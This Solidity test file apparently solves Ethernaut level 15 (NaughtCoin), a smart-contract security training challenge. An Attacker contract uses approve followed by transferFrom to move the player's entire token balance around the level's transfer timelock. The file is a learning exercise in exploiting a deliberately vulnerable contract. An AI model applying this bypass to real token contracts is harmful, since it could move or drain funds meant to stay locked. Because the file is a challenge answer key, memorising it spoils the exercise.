pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface INaughtCoin {
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function approve(address op, uint256 amount) external;

    function balanceOf(address) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);
}

contract Attacker {
    INaughtCoin coin;

    constructor(INaughtCoin _coin) {
        coin = _coin;
    }

    function attack() external {
        coin.transferFrom(
            msg.sender,
            address(this),
            coin.balanceOf(msg.sender)
        );
    }
}

contract Ethernaut15 is EthernautTest {
    constructor() EthernautTest(15) {}

    function solve() internal override(EthernautTest) {
        Attacker attacker = new Attacker(INaughtCoin(instance));
        INaughtCoin(instance).approve(address(attacker), type(uint256).max);
        attacker.attack();
    }
}
